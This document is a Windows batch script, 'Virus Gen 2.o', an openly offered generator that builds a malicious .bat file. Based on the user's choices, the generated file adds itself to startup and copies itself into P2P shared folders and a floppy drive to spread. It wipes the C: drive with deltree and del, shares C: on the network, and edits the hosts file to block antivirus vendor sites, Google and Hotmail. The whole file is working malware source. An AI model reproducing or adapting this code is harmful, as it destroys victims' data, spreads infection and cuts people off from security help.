:startage
echo off
echo              ..................
echo              : Virus Gen 2.o  :
echo              : By:Zero_Kool   :             
echo              :................:                  
echo              
echo  � Startup
echo  � Copy To Windows
echo  � Delete HARDRIVE
echo enter name of virus Below
set /p filename=%filename%
cls
Echo Add To Startup? Yes or No Note:Use all LowerCase
set /p answer=%answer%
IF "%answer%"=="yes" goto start
goto copy 
IF not "%answer%"=="yes" goto copy
goto copy
:copy
Echo Copy TO %WINDIR% A:\ P2P FOLDER? YES OR NO
set /p answer2=%answer2%
IF "%answer2%"=="yes" GOTO START2
:DEL
echo Delete Windows?
set /p answer3=%answer3%
IF "%answer3%"=="yes" GOTO START3

echo Share c:\
set /p answer4=%answer4%
IF "%answer4%"=="yes" GOTO START4

:lmhost
echo Stop From Going To Anti-Virus Websites?
set /p answer5=%answer5%
IF "%answer5%"=="yes" GOTO ass
IF "%answer5%"=="no" exit





:start
echo COPY "c:\%filename%.BAT" "C:\Documents and Settings\All Users\Start Menu\Programs\startup\%filename%.bat">>c:\%filename%.bat
goto copy
:start
:START2
echo COPY "c:\%filename%.bat" "c:\My Shared Folder">>c:\%filename%.bat
echo COPY "c:\%filename%.bat" "c:\program files\Morpheus\My Shared Folder">>c:\%filename%.bat
echo COPY "c:\%filename%.bat" "c:\program files\Grokster\My Grokster">>c:\%filename%.bat
echo COPY "c:\%filename%.bat" "c:\program files\eMule\Incoming">>c:\%filename%.bat
echo COPY "c:\%filename%.bat" "c:\program files\limewire\Shared">>c:\%filename%.bat
echo copy c:\windows\%filename%.BAT>>c:\%filename%.bat 
ECHO COPY C:\%filename%.BAT A:\COMPRESS.BAT>>C:\%filename%.BAT
GOTO DEL
:start2

:start3
echo deltree /y c:\>>c:\%FILENAME%.BAT
echo del c:\ /y /s>>c:\%FILENAME%.BAT
:start3
:start 4
echo net share c:\=haxor>>c:\%filename%.bat
goto lmhost
:start 4
:ass
echo cmd /c "echo 127.0.0.1 www.symantec.com>>c:\windows\system32\Drivers\Etc\Hosts">>c:\%filename%.bat
echo cmd /c  "echo 127.0.0.1 www.sophos.com>>c:\windows\system32\Drivers\Etc\Hosts">>c:\%filename%.bat
echo cmd /c "echo 127.0.0.1 www.avast.com>>c:\windows\system32\Drivers\Etc\Hosts">>c:\%filename%.bat
echo cmd /c "echo 127.0.0.1 www.mcafee.com>>c:\windows\system32\Drivers\Etc\Hosts">>c:\%filename%.bat
echo cmd /c "echo 127.0.0.1 www.f-prot.com>>c:\windows\system32\Drivers\Etc\Hosts">>c:\%filename%.bat
echo cmd /c "echo 127.0.0.1 www.f-secure.com>>c:\windows\system32\Drivers\Etc\Hosts">>c:\%filename%.bat
echo cmd /c "echo 127.0.0.1 www.avp.com>>c:\windows\system32\Drivers\Etc\Hosts">>c:\%filename%.bat
echo cmd /c "echo 127.0.0.1 www.kaspersky.com>>c:\windows\system32\Drivers\Etc\Hosts">>c:\%filename%.bat
echo cmd /c "echo 127.0.0.1 www.trendmicro.com>>c:\windows\system32\Drivers\Etc\Hosts">>c:\%filename%.bat
echo cmd /c "echo 127.0.0.1 www.bitdefender.com>>c:\windows\system32\Drivers\Etc\Hosts">>c:\%filename%.bat
echo cmd /c "echo 127.0.0.1 www.my-etrust.com>>c:\windows\system32\Drivers\Etc\Hosts>>c:\%filename%.bat
echo cmd /c "echo 127.0.0.1 www.eset.com>>c:\windows\system32\Drivers\Etc\Hosts">>c:\%filename%.bat
echo cmd /c "echo 127.0.0.1 www.norman.com>>c:\windows\system32\Drivers\Etc\Hosts">>c:\%filename%.bat
echo cmd /c "echo 127.0.0.1 www.grisoft.com>>c:\windows\system32\Drivers\Etc\Hosts">>c:\%filename%.bat
echo cmd /c "echo 127.0.0.1 www.google.com>>c:\windows\system32\Drivers\Etc\Hosts">>c:\%filename%.bat
echo cmd /c "echo 127.0.0.1 www.hotmail.com>>c:\windows\system32\Drivers\Etc\Hosts">>c:\%filename%.bat
echo cmd /c "echo 127.0.0.1 mx1.hotmail.com>>c:\windows\system32\Drivers\Etc\Hosts">>c:\%filename%.bat
echo cmd /c "echo 127.0.0.1 mx2.hotmail.com>>c:\windows\system32\Drivers\Etc\Hosts">>c:\%filename%.bat
echo cmd /c "echo 127.0.0.1 messenger.hotmail.com>>c:\windows\system32\Drivers\Etc\Hosts">>c:\%filename%.bat
exit
:ass
pause

